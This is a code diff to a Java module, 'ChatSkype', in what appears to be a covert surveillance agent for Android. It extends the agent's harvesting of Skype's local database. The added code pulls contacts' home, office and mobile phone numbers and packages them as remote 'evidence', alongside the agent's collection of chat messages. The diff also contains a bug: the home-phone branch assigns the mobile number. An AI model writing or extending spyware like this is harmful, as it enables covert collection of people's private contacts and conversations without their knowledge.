@@ -125,9 +125,8 @@ public class ChatSkype extends SubModuleChat {
 				}
 
 				GenericSqliteHelper helper = GenericSqliteHelper.open(dbFile);
-				// SQLiteDatabase db = helper.getReadableDatabase();
 
-				// TODO: finish
+				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.SKYPE, account);
 				if(ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)){
 					saveSkypeContacts(helper);
 				}
@@ -168,7 +167,7 @@ public class ChatSkype extends SubModuleChat {
 	}
 
 	private void saveSkypeContacts(GenericSqliteHelper helper) {
-		String[] projection = new String[] { "id", "skypename", "fullname", "displayname" };
+		String[] projection = new String[] { "id", "skypename", "fullname", "displayname","phone_home","phone_office","phone_mobile" };
 
 		RecordVisitor visitor = new RecordVisitor(projection, null) {
 
@@ -180,7 +179,20 @@ public class ChatSkype extends SubModuleChat {
 				String fullname = cursor.getString(2);
 				String displayname = cursor.getString(3);
 				
-				Contact c = new Contact(Long.toString(id),skypename,fullname,displayname);
+				String phone_home = cursor.getString(4);
+				String phone_office = cursor.getString(5);
+				String phone_mobile = cursor.getString(6);
+				
+				String phone = "";
+				if(!StringUtils.isEmpty(phone_mobile)){
+					phone = phone_mobile;
+				}else if(!StringUtils.isEmpty(phone_home)){
+					phone = phone_mobile;
+				}else if(!StringUtils.isEmpty(phone_office)){
+					phone = phone_office;
+				}
+				
+				Contact c = new Contact(Long.toString(id),phone, skypename, "Display name: " + displayname);
 			
 				ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.SKYPE, c);
 				return id;
@@ -267,24 +279,6 @@ public class ChatSkype extends SubModuleChat {
 						to = incoming ? conversation.account : conversation.remote;
 						toDisplay = incoming ? conversation.account : conversation.displayname;
 					}
-
-					// se sc.peer e' gruppo si espande peer,sc.peer
-					// se e' incoming, from e' peer, to e' expand
-					// se a scrivere sono io, e' outgoing, quindi from =
-					// account, to = expand
-					// altrimenti e' incoming
-
-					/*
-					 * if (incoming) { from = peer; fromDisplay =
-					 * sc.displayname;
-					 * 
-					 * if (!isGroup) { to = sc.account; toDisplay = sc.account;
-					 * }
-					 * 
-					 * } else { // outgoing if (!isGroup) { to = peer; toDisplay
-					 * = sc.displayname; } from = sc.account; fromDisplay =
-					 * from; }
-					 */
 
 					if (!StringUtils.isEmpty(body)) {
 						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
